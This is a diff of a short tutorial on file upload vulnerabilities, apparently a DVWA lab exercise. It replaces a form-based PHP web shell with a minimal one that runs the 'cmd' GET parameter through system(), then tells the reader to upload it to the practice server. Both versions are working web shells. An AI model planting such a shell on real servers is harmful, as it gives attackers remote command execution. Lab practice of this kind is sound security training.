@@ -1,23 +1,18 @@
 In file upload vulnerability we will try to upload a simple php shell in the upload section and try to execute command on the victim pc
 
-Simple GUI php shell
+Simple php shell
 ```
 <?php
-if (isset($_POST['cmd'])) {
-    $cmd = $_POST['cmd'];
-    echo "<pre>" . shell_exec($cmd) . "</pre>";
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
 }
 ?>
-<form method="POST">
-    <input type="text" name="cmd" placeholder="Enter command" />
-    <input type="submit" value="Execute" />
-</form>
 ```
 create a .php file and paste the code into it
 
 Now we will try to upload it into dvwa server
 
-![image](https://github.com/user-attachments/assets/1799b445-c2d7-4217-8430-9adee9c317bd)
+![image](https://github.com/user-attachments/assets/f02dda76-671a-40b8-a531-2e92ba49a56c)
 
 ![image](https://github.com/user-attachments/assets/d18b0643-30a1-4c78-8281-58f350dc5f0d)
 
